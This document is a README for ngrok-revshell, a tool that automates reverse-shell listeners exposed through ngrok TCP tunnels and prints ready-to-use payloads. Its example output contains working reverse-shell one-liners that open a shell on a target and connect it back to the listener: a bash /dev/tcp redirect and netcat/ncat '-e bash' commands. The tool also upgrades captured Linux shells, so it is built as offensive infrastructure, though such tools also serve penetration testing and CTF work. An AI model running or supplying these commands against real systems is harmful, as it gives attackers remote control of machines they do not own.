# ngrok-revshell

Automate reverse shell setup using ngrok tunnels.

## What it does

- Sets up a local listener on your chosen port
- Creates an ngrok TCP tunnel to expose your listener publicly
- Displays ready-to-use example reverse shell commands with your public IP/port
- Automatically upgrades Linux shells for better interactivity
- Supports both Linux/Mac and Windows shells

## Installation

```bash
# Clone the repository
git clone https://github.com/Nissen96/ngrok-revshell.git
cd ngrok-revshell

# Install dependencies with uv
uv sync
```

## Setup

1. Sign up for an [ngrok account](https://dashboard.ngrok.com/signup) if you don't have one.
2. Get your ngrok auth token: [Your Authtoken](https://dashboard.ngrok.com/get-started/your-authtoken)
3. Set your auth token:
   ```bash
   export NGROK_AUTHTOKEN=your_token_here
   ```
   Or create a `.env` file:
   ```
   NGROK_AUTHTOKEN=your_token_here
   ```

## Usage

```bash
# Basic usage (defaults to bash)
uv run revshell.py 4444

# Specify shell type
uv run revshell.py 4444 powershell
uv run revshell.py 4444 sh
```

## Options

- **PORT**: Local port to listen on (1-65535)
- **SHELL**: Shell type for reverse shell examples (optional, defaults to bash)

### Supported Shells

**Linux/Unix:**
- `sh`, `bash`, `zsh`, `fish`, `dash`, `ash`, `ksh`, `csh`, `tcsh`, `mksh`, `pdksh`

**Windows:**
- `powershell`, `pwsh`, `cmd`

## Example Output

```
[+] Setting up ngrok tunnel...
[+] Listening at 1.2.3.4:12345 (abc123.ngrok.io)...

=============== REVSHELL EXAMPLES ===============

Bash:
────────────────────────────────────────────
bash -i >& /dev/tcp/1.2.3.4/12345 0>&1
────────────────────────────────────────────

Netcat:
────────────────────────────────────────────
nc 1.2.3.4 12345 -e bash
ncat 1.2.3.4 12345 -e bash
────────────────────────────────────────────

[+] Waiting for connection...
    Press Ctrl+C to exit
```

## Features

- **Automatic shell upgrade**: Linux shells get PTY upgrades, aliases, and proper terminal settings
- **Multiple examples**: Bash, Netcat, Python, Perl, Ruby, and PowerShell reverse shells
- **Clean exit**: Automatically closes ngrok tunnels when you exit
- **Cross-platform**: Works on Linux, macOS, and Windows

## Requirements

- Python 3.9+
- ngrok account and auth token
- `uv` package manager (recommended) or `pip`

## License

MIT
